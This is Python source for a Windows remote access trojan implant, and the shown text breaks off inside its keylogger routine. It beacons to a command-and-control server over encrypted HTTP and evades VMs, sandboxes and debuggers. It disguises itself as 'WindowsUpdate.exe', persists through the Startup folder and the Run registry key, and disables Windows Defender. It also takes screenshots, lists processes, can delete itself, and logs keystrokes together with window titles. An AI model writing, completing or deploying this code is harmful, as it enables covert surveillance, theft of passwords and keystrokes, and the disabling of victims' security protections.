import socket
import subprocess
import os
import threading
import json
import base64
import sys
import time
import platform
import random
import struct
import zlib
import ssl
import io
import urllib.request
import urllib.error
import urllib.parse
import winreg
import ctypes
from shutil import copyfile


# ============================================================
#  Inline .env loader (replaces python-dotenv)
# ============================================================
def _load_dotenv(path=".env"):
    """Parse .env file and inject into os.environ (only if key not already set)"""
    try:
        with open(path, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, _, val = line.partition("=")
                key = key.strip()
                val = val.strip()
                # Strip surrounding quotes
                if len(val) >= 2 and val[0] == val[-1] and val[0] in ('"', "'"):
                    val = val[1:-1]
                os.environ.setdefault(key, val)
    except FileNotFoundError:
        pass

_load_dotenv()


# ============================================================
#  Configuration
# ============================================================
PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate

C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")
RETRY_DELAY = 30  # seconds
# Cap MUST stay below the server's HEARTBEAT_TIMEOUT (60s) — otherwise one
# transient outage makes the client sleep past the dead threshold and the
# operator sees it vanish even though the process is alive
RETRY_BACKOFF_MIN = 5
RETRY_BACKOFF_MAX = 45
POLLING_DELAY = 1.0  # Responsive 1s command poll
JITTER = 0.2  # +/- 0.2s jitter
CMD_TIMEOUT = 60  # Max seconds a shell command can run
MAX_RESULT_BYTES = 512 * 1024  # Cap on command output sent back to C2
MAX_OUTBOX = 50  # Max results queued while delivery is failing
MUTEX_NAME = "Global\\WindowsUpdateMutex"
LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")
ANTI_VM = False  # Set to False if you're testing in a VM
DEBUG = False  # Set to True for console debug output


# ============================================================
#  Stealth: Realistic User-Agent Pool
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.7.3329.41",
]

# Track current working directory for cd support
current_dir = os.getcwd()
client_id = None  # Set after registration


def get_username():
    """Current user name — robust when no interactive session exists (scheduled task/service)"""
    try:
        import getpass
        return getpass.getuser()
    except Exception:
        return os.environ.get("USERNAME", "unknown")


def get_stable_machine_id():
    """Per-Windows-install identifier that survives IP changes, DHCP renewals,
    and VPN toggles. Falls back to hostname+user if the registry is unreadable."""
    try:
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography"
        ) as k:
            guid, _ = winreg.QueryValueEx(k, "MachineGuid")
            return str(guid)[:16]
    except Exception:
        return f"{socket.gethostname()}-{get_username()}"


# ============================================================
#  AES-256 + RSA Hybrid Encryption
# ============================================================
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes

aes_session_key = get_random_bytes(32)  # 256-bit AES key
server_rsa_pub_key = None


def encrypt_aes(data: str) -> str:
    """Encrypt string with AES-256-GCM"""
    cipher = AES.new(aes_session_key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
    payload = cipher.nonce + tag + ciphertext
    return base64.b64encode(payload).decode()


def decrypt_aes(raw_b64: str) -> str:
    """Decrypt base64 encoded AES-256-GCM payload"""
    raw = base64.b64decode(raw_b64)
    nonce = raw[:16]
    tag = raw[16:32]
    ciphertext = raw[32:]
    cipher = AES.new(aes_session_key, AES.MODE_GCM, nonce=nonce)
    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
    return decrypted.decode('utf-8')


# ============================================================
#  HTTP helpers (replaces requests — pure stdlib)
# ============================================================
_ssl_ctx = ssl.create_default_context()
_ssl_ctx.check_hostname = False
_ssl_ctx.verify_mode = ssl.CERT_NONE

_current_ua = None


def _get_ua():
    global _current_ua
    if _current_ua is None:
        _current_ua = random.choice(USER_AGENTS)
    return _current_ua


def _default_headers():
    return {
        "User-Agent": _get_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }


class _HttpResponse:
    """Minimal response object matching the interface used by C2 functions"""
    __slots__ = ("_body", "status_code")

    def __init__(self, body: bytes, status_code: int):
        self._body = body
        self.status_code = status_code

    @property
    def text(self):
        return self._body.decode("utf-8", errors="replace")

    @property
    def content(self):
        return self._body


def _http_get(url, params=None, timeout=10):
    """HTTP GET → _HttpResponse.  Raises ConnectionError on network failure."""
    if params:
        url = url + "?" + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, headers=_default_headers())
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx)
        return _HttpResponse(resp.read(), resp.status)
    except urllib.error.HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return _HttpResponse(body, e.code)
    except (urllib.error.URLError, socket.timeout, OSError) as e:
        raise ConnectionError(str(e))


def _http_post(url, data, headers=None, params=None, timeout=10):
    """HTTP POST → _HttpResponse.  Raises ConnectionError on network failure."""
    if params:
        url = url + "?" + urllib.parse.urlencode(params)
    hdrs = _default_headers()
    if headers:
        hdrs.update(headers)
    if isinstance(data, str):
        data = data.encode("utf-8")
    req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx)
        return _HttpResponse(resp.read(), resp.status)
    except urllib.error.HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return _HttpResponse(body, e.code)
    except (urllib.error.URLError, socket.timeout, OSError) as e:
        raise ConnectionError(str(e))


# ============================================================
#  Encrypted C2 Communication
# ============================================================
def fetch_server_rsa_pub():
    """Fetch server RSA public key during startup handshake"""
    global server_rsa_pub_key
    try:
        url = f"{C2_DOMAIN}/rsa_pub"
        if DEBUG: print(f"[*] Fetching RSA public key from {url}...")
        resp = _http_get(url, timeout=10)
        if resp.status_code == 200 and resp.text.strip():
            server_rsa_pub_key = RSA.import_key(resp.text)
            if DEBUG: print("[+] RSA public key fetched successfully.")
            return True
        else:
            print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
    except ConnectionError:
        print(f"[!] Cannot connect to server at {C2_DOMAIN} — is server.py running?")
    except Exception as e:
        print(f"[!] Error fetching RSA key: {e}")
    return False


def c2_post(endpoint, data, timeout=10):
    """Send AES-encrypted POST (with RSA-encrypted session key for /register)"""
    if DEBUG: print(f"[*] Sending POST to {endpoint}...")
    global server_rsa_pub_key, aes_session_key
    json_data = json.dumps(data)

    if endpoint.strip("/") == "register":
        # Always re-fetch RSA key and regenerate AES session key before registration
        # — the server may have restarted with a new RSA key pair
        aes_session_key = get_random_bytes(32)
        fetch_server_rsa_pub()

        if server_rsa_pub_key:
            rsa_cipher = PKCS1_OAEP.new(server_rsa_pub_key, hashAlgo=SHA256)
            enc_session_key = base64.b64encode(rsa_cipher.encrypt(aes_session_key)).decode()
            encrypted_payload = encrypt_aes(json_data)

            hybrid_packet = {
                "encrypted_session_key": enc_session_key,
                "payload": encrypted_payload
            }
            resp = _http_post(
                f"{C2_DOMAIN}{endpoint}",
                data=json.dumps(hybrid_packet),
                headers={"Content-Type": "application/json"},
                timeout=timeout
            )
            if DEBUG: print(f"[*] Response from {endpoint}: {resp.status_code}")
            if resp.status_code != 200:
                if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
            return resp

    # Standard AES-encrypted request
    encrypted = encrypt_aes(json_data)
    params = {}
    if client_id:
        params["id"] = client_id
    resp = _http_post(
        f"{C2_DOMAIN}{endpoint}",
        data=encrypted,
        headers={"Content-Type": "application/octet-stream"},
        params=params,
        timeout=timeout
    )
    if DEBUG: print(f"[*] Response from {endpoint}: {resp.status_code}")
    if resp.status_code != 200:
        if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
    return resp


def c2_get(endpoint, params=None, timeout=10):
    """GET from C2 and decrypt AES response. Never accepts plaintext.
    Any non-200 (e.g. 401 from a restarted server that lost our session)
    is surfaced as a re-register signal."""
    if DEBUG: print(f"[*] Polling {endpoint}...")
    resp = _http_get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
    if resp.status_code != 200:
        return {"action": "re-register"}
    if resp.text.strip():
        try:
            return json.loads(decrypt_aes(resp.text))
        except Exception:
            return None
    return None


# ============================================================
#  Result Outbox — reliable result delivery
# ============================================================
_result_outbox = []
_outbox_lock = threading.Lock()


def send_result(payload):
    """Queue a result for delivery to C2; retried automatically on later polls.
    Deliberately in-memory only — result data is never written to disk."""
    with _outbox_lock:
        _result_outbox.append(payload)
        if len(_result_outbox) > MAX_OUTBOX:
            del _result_outbox[:len(_result_outbox) - MAX_OUTBOX]


def flush_outbox():
    """Deliver queued results oldest-first. Stops at the first failure and
    leaves the undelivered remainder queued for the next poll cycle."""
    while True:
        with _outbox_lock:
            if not _result_outbox:
                return True
            item = _result_outbox[0]
        try:
            resp = c2_post("/result", item)
            if resp.status_code != 200:
                return False
        except Exception:
            return False
        with _outbox_lock:
            _result_outbox.pop(0)


# ============================================================
#  Anti-VM / Sandbox Detection
# ============================================================
def is_vm_or_sandbox():
    """Detect if running inside a VM, sandbox, or analysis environment"""
    indicators = 0

    # Check for VM/analysis processes
    try:
        output = subprocess.check_output(
            "tasklist /FO CSV /NH", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').lower()
        vm_processes = [
            "vmtoolsd", "vmwaretray", "vmwareuser", "vmacthlp",
            "vboxservice", "vboxtray",
            "sandboxiedcomlaunch", "sandboxierpcss",
            "joeboxcontrol", "joeboxserver",
        ]
        for proc in vm_processes:
            if proc in output:
                indicators += 2
    except Exception:
        pass

    # Check MAC address prefixes (VMware, VirtualBox, Hyper-V)
    try:
        output = subprocess.check_output(
            "getmac /FO CSV /NH", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').upper()
        vm_macs = [
            "00-05-69", "00-0C-29", "00-1C-14", "00-50-56",  # VMware
            "08-00-27",  # VirtualBox
            "00-03-FF", "00-15-5D",  # Hyper-V
        ]
        for mac in vm_macs:
            if mac in output:
                indicators += 2
    except Exception:
        pass

    # Check system manufacturer via WMI
    try:
        output = subprocess.check_output(
            "wmic computersystem get manufacturer", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').lower()
        if any(x in output for x in ["vmware", "virtualbox", "qemu", "xen", "innotek", "bochs"]):
            indicators += 3
    except Exception:
        pass

    # Check for small disk (VMs often < 60GB)
    try:
        output = subprocess.check_output(
            "wmic diskdrive get size", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace')
        for line in output.strip().split('\n'):
            line = line.strip()
            if line.isdigit():
                gb = int(line) / (1024 ** 3)
                if gb < 60:
                    indicators += 1
                break
    except Exception:
        pass

    # Check CPU count (sandboxes often have 1-2 cores)
    try:
        if os.cpu_count() is not None and os.cpu_count() <= 2:
            indicators += 1
    except Exception:
        pass

    # Check Recent folder (sandboxes have very few recent files)
    try:
        recent = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Recent")
        if os.path.exists(recent) and len(os.listdir(recent)) < 5:
            indicators += 1
    except Exception:
        pass

    # Threshold: 3+ indicators = likely VM/sandbox
    return indicators >= 3


# ============================================================
#  Anti-Debug Detection
# ============================================================
def is_debugger_present():
    """Detect if a debugger or analysis tool is attached"""
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except Exception:
        pass

    try:
        output = subprocess.check_output(
            "tasklist /FO CSV /NH", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').lower()
        analysis_tools = [
            "wireshark", "fiddler", "burpsuite", "charles",
            "procmon", "procexp", "processhacker",
            "ollydbg", "x64dbg", "x32dbg", "windbg",
            "ida", "ida64", "ghidra",
            "dnspy", "pestudio", "regshot",
            "autoruns", "tcpview",
        ]
        for tool in analysis_tools:
            if tool in output:
                return True
    except Exception:
        pass

    return False


# ============================================================
#  Console Hiding
# ============================================================
def hide_console():
    """Hide the console window"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
    except Exception:
        pass


# ============================================================
#  Single Instance Guard
# ============================================================
_mutex_handle = None
_lock_fh = None


def check_single_instance():
    """Ensure only one instance runs using mutex + lockfile fallback"""
    global _mutex_handle, _lock_fh

    # Method 1: Windows named mutex
    try:
        _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        last_err = ctypes.windll.kernel32.GetLastError()
        if last_err == 183:  # ERROR_ALREADY_EXISTS
            sys.exit(0)
    except Exception:
        pass

    # Method 2: Lockfile fallback
    try:
        if os.path.exists(LOCK_FILE):
            with open(LOCK_FILE, "r") as f:
                old_pid = int(f.read().strip())
            try:
                os.kill(old_pid, 0)
                sys.exit(0)
            except (OSError, ProcessLookupError):
                pass

        _lock_fh = open(LOCK_FILE, "w")
        _lock_fh.write(str(os.getpid()))
        _lock_fh.flush()
    except Exception:
        pass


# ============================================================
#  Persistence
# ============================================================
def add_persistence():
    """Add persistence via Startup folder + Registry Run key"""
    try:
        payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
        if not os.path.exists(payload_path):
            copyfile(sys.executable, payload_path)

        try:
            regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(regkey)
        except Exception:
            pass
    except Exception:
        pass


def remove_persistence():
    """Remove all persistence mechanisms"""
    try:
        payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
        if os.path.exists(payload_path):
            os.remove(payload_path)
    except Exception:
        pass
    try:
        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(regkey, "WindowsUpdate")
        winreg.CloseKey(regkey)
    except Exception:
        pass


def disable_defender():
    try:
        subprocess.Popen("powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.Popen("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass


# ============================================================
#  Process List
# ============================================================
def get_process_list():
    """Get list of running processes as JSON string"""
    try:
        import csv

        output = subprocess.check_output(
            "tasklist /FO CSV /V", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace')

        f = io.StringIO(output)
        reader = csv.DictReader(f)
        processes = []
        for row in reader:
            processes.append({
                "name": row.get("Image Name", "Unknown"),
                "pid": row.get("PID", "0"),
                "mem": row.get("Mem Usage", ""),
                "user": row.get("User Name", ""),
                "cpu": row.get("CPU Time", ""),
                "title": row.get("Window Title", "")
            })

        return "[JSON_PROCS]" + json.dumps(processes)
    except Exception as e:
        return f"[-] Error gathering processes: {str(e)}"


# ============================================================
#  System Info
# ============================================================
def get_system_info():
    """Gather detailed system information"""
    try:
        info_lines = []
        info_lines.append(f"Hostname    : {socket.gethostname()}")
        info_lines.append(f"OS          : {platform.system()} {platform.release()} ({platform.version()})")
        info_lines.append(f"Architecture: {platform.machine()}")
        info_lines.append(f"Processor   : {platform.processor()}")
        info_lines.append(f"Username    : {get_username()}")
        info_lines.append(f"PID         : {os.getpid()}")
        info_lines.append(f"CWD         : {current_dir}")

        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            info_lines.append(f"Admin       : {'Yes' if is_admin else 'No'}")
        except Exception:
            info_lines.append(f"Admin       : Unknown")

        try:
            result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            info_lines.append(f"\n--- Network ---\n{result.decode('utf-8', errors='replace')}")
        except Exception:
            pass

        return "\n".join(info_lines)
    except Exception as e:
        return f"[-] Error gathering sysinfo: {str(e)}"


# ============================================================
#  Screenshot — Pure GDI + stdlib PNG  (replaces mss + Pillow)
# ============================================================

# Set up GDI ctypes signatures for 64-bit safety
_user32 = ctypes.windll.user32
_gdi32 = ctypes.windll.gdi32

_user32.GetDC.argtypes = [ctypes.c_void_p]
_user32.GetDC.restype = ctypes.c_void_p
_user32.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
_user32.ReleaseDC.restype = ctypes.c_int
_user32.GetSystemMetrics.argtypes = [ctypes.c_int]
_user32.GetSystemMetrics.restype = ctypes.c_int

_gdi32.CreateCompatibleDC.argtypes = [ctypes.c_void_p]
_gdi32.CreateCompatibleDC.restype = ctypes.c_void_p
_gdi32.CreateCompatibleBitmap.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
_gdi32.CreateCompatibleBitmap.restype = ctypes.c_void_p
_gdi32.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
_gdi32.SelectObject.restype = ctypes.c_void_p
_gdi32.BitBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
                           ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_uint32]
_gdi32.BitBlt.restype = ctypes.c_bool
_gdi32.GetDIBits.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint,
                              ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint]
_gdi32.GetDIBits.restype = ctypes.c_int
_gdi32.DeleteObject.argtypes = [ctypes.c_void_p]
_gdi32.DeleteObject.restype = ctypes.c_bool
_gdi32.DeleteDC.argtypes = [ctypes.c_void_p]
_gdi32.DeleteDC.restype = ctypes.c_bool


class _BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', ctypes.c_uint32),
        ('biWidth', ctypes.c_int32),
        ('biHeight', ctypes.c_int32),
        ('biPlanes', ctypes.c_uint16),
        ('biBitCount', ctypes.c_uint16),
        ('biCompression', ctypes.c_uint32),
        ('biSizeImage', ctypes.c_uint32),
        ('biXPelsPerMeter', ctypes.c_int32),
        ('biYPelsPerMeter', ctypes.c_int32),
        ('biClrUsed', ctypes.c_uint32),
        ('biClrImportant', ctypes.c_uint32),
    ]


def _create_png_from_bgra(width, height, bgra_data, stride):
    """Create a PNG file from raw BGRA pixel buffer using only stdlib (struct + zlib)"""

    def _png_chunk(chunk_type, data):
        raw = chunk_type + data
        crc = zlib.crc32(raw) & 0xffffffff
        return struct.pack('>I', len(data)) + raw + struct.pack('>I', crc)

    # Pre-allocate: each row = 1 filter byte + width * 3 RGB bytes
    row_len = 1 + width * 3
    raw = bytearray(row_len * height)

    for y in range(height):
        out_row = y * row_len
        raw[out_row] = 0  # PNG row filter: None
        in_row = y * stride
        out_px = out_row + 1
        for x in range(width):
            src = in_row + x * 4
            raw[out_px]     = bgra_data[src + 2]  # R
            raw[out_px + 1] = bgra_data[src + 1]  # G
            raw[out_px + 2] = bgra_data[src]      # B
            out_px += 3

    ihdr = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
    idat = zlib.compress(bytes(raw), 6)

    return (b'\x89PNG\r\n\x1a\n' +
            _png_chunk(b'IHDR', ihdr) +
            _png_chunk(b'IDAT', idat) +
            _png_chunk(b'IEND', b''))


def take_screenshot():
    """Capture screenshot using Windows GDI and return base64 encoded PNG"""
    try:
        # Virtual screen (all monitors)
        left   = _user32.GetSystemMetrics(76)  # SM_XVIRTUALSCREEN
        top    = _user32.GetSystemMetrics(77)  # SM_YVIRTUALSCREEN
        width  = _user32.GetSystemMetrics(78)  # SM_CXVIRTUALSCREEN
        height = _user32.GetSystemMetrics(79)  # SM_CYVIRTUALSCREEN

        if width <= 0 or height <= 0:
            # Fallback to primary monitor
            width  = _user32.GetSystemMetrics(0)
            height = _user32.GetSystemMetrics(1)
            left = top = 0

        hdc_screen = _user32.GetDC(None)
        hdc_mem = _gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = _gdi32.CreateCompatibleBitmap(hdc_screen, width, height)

        old_obj = _gdi32.SelectObject(hdc_mem, hbmp)
        _gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, left, top, 0x00CC0020)  # SRCCOPY
        _gdi32.SelectObject(hdc_mem, old_obj)

        # Read pixel data
        bmi = _BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(_BITMAPINFOHEADER)
        bmi.biWidth = width
        bmi.biHeight = -height  # Top-down DIB
        bmi.biPlanes = 1
        bmi.biBitCount = 32     # BGRA
        bmi.biCompression = 0   # BI_RGB

        buf_size = width * height * 4
        buf = ctypes.create_string_buffer(buf_size)
        _gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf, ctypes.byref(bmi), 0)

        # Cleanup GDI
        _gdi32.DeleteObject(hbmp)
        _gdi32.DeleteDC(hdc_mem)
        _user32.ReleaseDC(None, hdc_screen)

        # Convert BGRA → PNG
        png_bytes = _create_png_from_bgra(width, height, buf.raw, width * 4)
        return base64.b64encode(png_bytes).decode()

    except Exception as e:
        return f"[-] Screenshot error: {str(e)}"


# ============================================================
#  Self-Destruct
# ============================================================
def self_destruct():
    """Remove persistence, delete executable, and exit"""
    remove_persistence()
    try:
        exe_path = sys.executable
        subprocess.Popen(
            f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass
    os._exit(0)


# ============================================================
#  Keystroke Logger (in-memory buffer only, never written to disk)
# ============================================================
import ctypes.wintypes as wintypes

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

_keylog_active = False
_keylog_thread = None
_keylog_hook = None          # keep the HOOKPROC reference alive (GC protection)
_keylog_tid = 0              # hook thread id — used to post WM_QUIT on stop
_keylog_lock = threading.Lock()
_keylog_buffer = []          # list of text fragments; joined on dump
_MAX_KEYLOG_CHARS = 100_000  # hard cap on retained keystrokes

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_QUIT = 0x0012
WM_KEYUP = 0x0101
WM_SYSKEYUP = 0x0105

VK_LSHIFT, VK_RSHIFT, VK_SHIFT = 0xA0, 0xA1, 0x10
VK_LCTRL, VK_RCTRL, VK_CONTROL = 0xA2, 0xA3, 0x11
VK_LMENU, VK_RMENU, VK_MENU = 0xA4, 0xA5, 0x12
VK_LWIN, VK_RWIN = 0x5B, 0x5C
VK_CAPITAL = 0x14


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG)),
    ]


# Low-level hook callback signature: LRESULT CALLBACK fn(int, WPARAM, LPARAM)
_HOOKPROC = ctypes.WINFUNCTYPE(
    ctypes.c_ssize_t, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM
)

# Explicit signatures — default windll restype (c_int) truncates 64-bit handles
user32.SetWindowsHookExW.restype = ctypes.c_void_p
user32.SetWindowsHookExW.argtypes = [ctypes.c_int, _HOOKPROC, ctypes.c_void_p, wintypes.DWORD]
user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
user32.PostThreadMessageW.argtypes = [wintypes.DWORD, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
kernel32.GetModuleHandleW.restype = ctypes.c_void_p
kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetCurrentThreadId.restype = wintypes.DWORD

# Keyboard translation APIs (HKL is pointer-sized — must not truncate)
user32.GetKeyboardLayout.restype = ctypes.c_void_p
user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
user32.MapVirtualKeyExW.restype = wintypes.UINT
user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, ctypes.c_void_p]
user32.ToUnicodeEx.restype = ctypes.c_int
user32.ToUnicodeEx.argtypes = [
    wintypes.UINT, wintypes.UINT, ctypes.POINTER(ctypes.c_ubyte),
    wintypes.LPWSTR, ctypes.c_int, wintypes.UINT, ctypes.c_void_p,
]
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
user32.GetKeyState.restype = ctypes.c_short
user32.GetKeyState.argtypes = [ctypes.c_int]

_SPECIAL_VK_NAMES = {
    0x08: "[BS]", 0x09: "[TAB]", 0x0D: "\n", 0x13: "",           # modifiers-only keys get ""
    0x14: "[CAPS]", 0x1B: "[ESC]", 0x20: " ",
    0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]",
    0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0x2D: "[INS]", 0x2E: "[DEL]",
    0x5B: "[WIN]", 0x5C: "[WIN]", 0x6A: "*", 0x6B: "+", 0x6D: "-", 0x6E: ".", 0x6F: "/",
}
for _i in range(0x70, 0x88):                                     # F1–F24
    _SPECIAL_VK_NAMES[_i] = f"[F{_i - 0x6F}]"
for _vk in (VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CONTROL, VK_LCTRL, VK_RCTRL,
            VK_MENU, VK_LMENU, VK_RMENU, 0x90, 0x91):            # + NumLock/ScrollLock
    _SPECIAL_VK_NAMES[_vk] = ""


def _keylog_append(text):
    with _keylog_lock:
        _keylog_buffer.append(text)
        total = sum(len(s) for s in _keylog_buffer)
        while total > _MAX_KEYLOG_CHARS and len(_keylog_buffer) > 1:
            total -= len(_keylog_buffer[0])
            _keylog_buffer.pop(0)


def _keylog_last_window():
    """Foreground window title for context lines in the dump"""
    try:
        hwnd = user32.GetForegroundWindow()
        buf = ctypes.create_unicode_buffer(256)
        user32.GetWindowTextW(hwnd, buf, 256)
        return buf.value.strip()
    except Exception:
        return ""


def _keylog_translate(vk):
    """Best-effort virtual-key → text. Returns None when the key is a bare modifier."""
    if vk in _SPECIAL_VK_NAMES:
        return _SPECIAL_VK_NAMES[vk]

    try:
        state = (ctypes.c_ubyte * 256)()
        async_bits = 0
        for mod_vk in (VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL):
            if user32.GetAsyncKeyState(mod_vk) & 0x8000 or (
                mod_vk == VK_CAPITAL and user32.GetKeyState(mod_vk) & 1
            ):
                async_bits |= mod_vk
        state[VK_SHIFT] = 0x80 if async_bits & (VK_SHIFT | VK_LSHIFT | VK_RSHIFT) else 0
        state[VK_CONTROL] = 0x80 if async_bits & (VK_CONTROL | VK_LCTRL | VK_RCTRL) else 0
        state[VK_MENU] = 0x80 if async_bits & (VK_MENU | VK_LMENU | VK_RMENU) else 0
        state[VK_CAPITAL] = 0x01 if user32.GetKeyState(VK_CAPITAL) & 1 else 0

        hkl = user32.GetKeyboardLayout(0)
        scan = user32.MapVirtualKeyExW(vk, 0, hkl)               # MAPVK_VK_TO_VSC
        buf = ctypes.create_unicode_buffer(8)
        n = user32.ToUnicodeEx(vk, scan, state, buf, 8, 0, hkl)
        if n > 0:
            return buf.value[:n]
    except Exception as e:
        global _keylog_last_error
        _keylog_last_error = f"{type(e).__name__}: {e}"
    return f"[VK:{vk:#04x}]"


_keylog_last_error = ""
_keylog_last_title = ""


def _keylog_proc(nCode, wParam, lParam):
    global _keylog_last_title
    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        try:
            vk = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode
            text = _keylog_translate(vk)
            if text:
                title = _keylog_last_window()
                ctx_marker = f"\n[{title}]\n" if title and title != _keylog_last_title else ""
                _keylog_last_title = title
                if ctx_marker:
                    _keylog_append(ctx_marker)
                _keylog_append(text)
        except Exception:
            pass
    return user32.CallNextHookEx(None, nCode, wParam, lParam)


_keylog_cb = _HOOKPROC(_keylog_proc)                             # keep callback alive


def start_keylogger():
    global _keylog_active, _keylog_thread, _keylog_tid
    if _keylog_active:
        return "[*] Keylogger already running"
    with _keylog_lock:
        _keylog_buffer.clear()

    def pump():
        global _keylog_tid, _keylog_hook
        _keylog_tid = kernel32.GetCurrentThreadId()
        _keylog_hook = user32.SetWindowsHookExW(
            WH_KEYBOARD_LL, _keylog_cb, kernel32.GetModuleHandleW(None), 0
        )
        if not _keylog_hook:
